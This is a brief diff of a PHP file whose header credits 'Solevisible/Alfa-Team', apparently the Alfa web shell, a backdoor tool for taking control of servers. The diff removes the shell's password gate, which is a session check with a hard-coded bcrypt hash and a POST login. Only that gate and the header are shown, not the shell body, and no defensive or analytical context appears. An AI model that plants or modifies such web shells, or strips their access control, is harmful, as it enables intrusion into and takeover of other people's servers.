@@ -1,14 +1,4 @@
 <?php
-session_start();
-$pass_hash = '$2y$10$BLrQhRtv0E7WzgiiyZbEnegndmfFwuzof9aJlvmYPDhUvuB1q3s9.';
-if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
-    $form_id = md5(time().rand(1,9999));
-    if(isset($_POST['pass']) && password_verify($_POST['pass'], $pass_hash)) {
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = time();
-        header("Location: ".$_SERVER['PHP_SELF']."?success"); exit;
-    }
-?>
-<?php
 /*
 	Author: 	Solevisible/Alfa-Team
 	Telegram: 	https://telegram.me/solevisible
